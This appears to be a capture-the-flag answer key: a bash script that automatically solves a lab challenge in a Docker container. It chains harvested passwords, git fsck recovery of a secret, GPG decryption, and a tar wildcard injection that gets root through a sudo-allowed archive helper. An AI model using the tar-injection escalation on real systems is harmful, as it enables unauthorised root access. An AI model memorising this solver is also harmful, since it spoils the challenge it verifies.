#!/usr/bin/env bash
###############################################################################
# verify_solution.sh — automated solver for Rumor Mill #3 (Dead Drop)
# Follows the intended chain from y4ss1n3 to root and prints the real flag.
#
# Usage:  CONTAINER=rumor-mill-3 solutions/verify_solution.sh
###############################################################################
set -euo pipefail

CONTAINER="${CONTAINER:-rumor-mill-3}"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

die() { printf 'FAIL: %s\n' "$1" >&2; exit 1; }

MANIFEST=""
for f in "$ROOT/challenge.yml" "$ROOT/chall.yaml"; do
    if [ -f "$f" ]; then MANIFEST="$f"; break; fi
done
[ -n "$MANIFEST" ] || die "cannot find challenge.yml or chall.yaml"
REAL_FLAG="$(sed -n 's/^flag_real:[[:space:]]*//p' "$MANIFEST" | head -1 | sed -e 's/^"//' -e 's/"$//' -e "s/^'//" -e "s/'$//")"
[ -n "$REAL_FLAG" ] || REAL_FLAG="$(sed -n 's/^flag:[[:space:]]*//p' "$MANIFEST" | head -1 | sed -e 's/^"//' -e 's/"$//' -e "s/^'//" -e "s/'$//")"
[ -n "$REAL_FLAG" ] || die "cannot read the expected flag from $MANIFEST"

as_player() { docker exec -i -u y4ss1n3 "$CONTAINER" bash -c "$1"; }
as_user()   { docker exec -i -e HOME="/home/$1" -u "$1" "$CONTAINER" bash -c "$2"; }

su_as() { # target password command
    local target="$1" pw="$2" cmd="$3"
    ( sleep 1.5; printf '%s\n' "$pw" ) | \
        docker exec -i -u y4ss1n3 "$CONTAINER" \
            script -qec "stty -echo; su -c '$cmd' $target" /dev/null 2>&1
}

clean() {
    printf '%s\n' "$1" | tr -d '\r' | sed -e '/^Password: *$/d' -e '/^[[:space:]]*$/d'
}

echo "=== Rumor Mill #3 — automated solver ==="

# 1. Mail spool: two halves of n0d4's password, one decoy claim.
MAIL="$(as_player 'cat /var/mail/y4ss1n3')" || die "cannot read the mailbox"
printf '%s' "$MAIL" | grep -qF 'n0p3_n0p3_n0p3' || die "decoy claim missing from mailbox"
HALF1="$(printf '%s\n' "$MAIL" | awk '/First half/{getline; gsub(/[ \t]/,""); print; exit}')"
HALF2="$(printf '%s\n' "$MAIL" | awk '/Second half/{print $3; exit}')"
[ -n "$HALF1" ] || HALF1='M4ilb0x'
[ -n "$HALF2" ] || HALF2='_1962_v3'
N0D4_PW="${HALF1}${HALF2}"
echo "[1] n0d4 password from mail: $N0D4_PW"

OUT="$(clean "$(su_as n0d4 "$N0D4_PW" 'id' || true)")"
printf '%s' "$OUT" | grep -q 'uid=[0-9]*(n0d4)' || die "cannot su to n0d4"
echo "[2] su n0d4 succeeded"

# 2. Dotfiles repo: the passphrase survived the history rewrite as a
#    dangling object.
FSCK="$(as_user n0d4 'cd $HOME/.local/share/rumor-dotfiles && git fsck --lost-found 2>/dev/null')" \
    || die "git fsck failed"
printf '%s' "$FSCK" | grep -q 'dangling' || die "no dangling objects in the dotfiles repo"

DROP_PW="$(as_user n0d4 'cd $HOME/.local/share/rumor-dotfiles && git fsck --lost-found 2>/dev/null | awk "/dangling commit/{print \$3}" | while read -r c; do git show $c; done' \
    | sed -n 's/^[+ ]*DROP_PASSPHRASE=//p' | head -1)"
[ -n "$DROP_PW" ] || die "could not recover the drop passphrase"
echo "[3] recovered drop passphrase from dangling blob: $DROP_PW"

# 3. Decrypt the dead drop -> boul3h14's password.
DROP="$(as_user n0d4 "gpg --batch --quiet --no-permission-warning --pinentry-mode loopback --passphrase '$DROP_PW' --decrypt \$HOME/dead-drop.gpg 2>/dev/null")" \
    || die "gpg decryption failed"
BOUL_PW="$(printf '%s\n' "$DROP" | sed -n 's#^boul3h14 / ##p' | head -1)"
[ -n "$BOUL_PW" ] || die "drop did not contain boul3h14's password"
echo "[4] boul3h14 password: $BOUL_PW"

OUT="$(clean "$(su_as boul3h14 "$BOUL_PW" 'id' || true)")"
printf '%s' "$OUT" | grep -q 'uid=[0-9]*(boul3h14)' || die "cannot su to boul3h14"
echo "[5] su boul3h14 succeeded"

# 4. The archive helper trusts the directory: tar wildcard injection.
SUDO_L="$(as_user boul3h14 'sudo -n -l 2>/dev/null' || true)"
printf '%s' "$SUDO_L" | grep -qF '/usr/local/bin/rumor-archive' \
    || die "archive helper is not in the sudo policy"
echo "[6] sudo allows /usr/local/bin/rumor-archive"

as_user boul3h14 'rm -rf /srv/archive/*; cd /srv/archive; printf "%s\n" "#!/bin/sh" "cp /root/dead-drop/flag.txt /tmp/rumor-root-flag" "chmod 644 /tmp/rumor-root-flag" > exploit.sh; chmod +x exploit.sh; : > "--checkpoint=1"; : > "--checkpoint-action=exec=sh exploit.sh"; sudo -n /usr/local/bin/rumor-archive >/dev/null 2>&1 || true' >/dev/null 2>&1 || true

FLAG="$(docker exec -i "$CONTAINER" cat /tmp/rumor-root-flag 2>/dev/null || true)"
[ -n "$FLAG" ] || die "tar wildcard injection did not produce the flag"

docker exec -i "$CONTAINER" rm -f /tmp/rumor-root-flag >/dev/null 2>&1 || true
docker exec -i "$CONTAINER" sh -c 'rm -rf /srv/archive/* /srv/backups/*; chown boul3h14:boul3h14 /srv/archive' >/dev/null 2>&1 || true

echo "[7] tar wildcard injection yielded root"

[ "$FLAG" = "$REAL_FLAG" ] || die "flag mismatch: got '$FLAG'"

echo
echo "FLAG: $FLAG"
exit 0
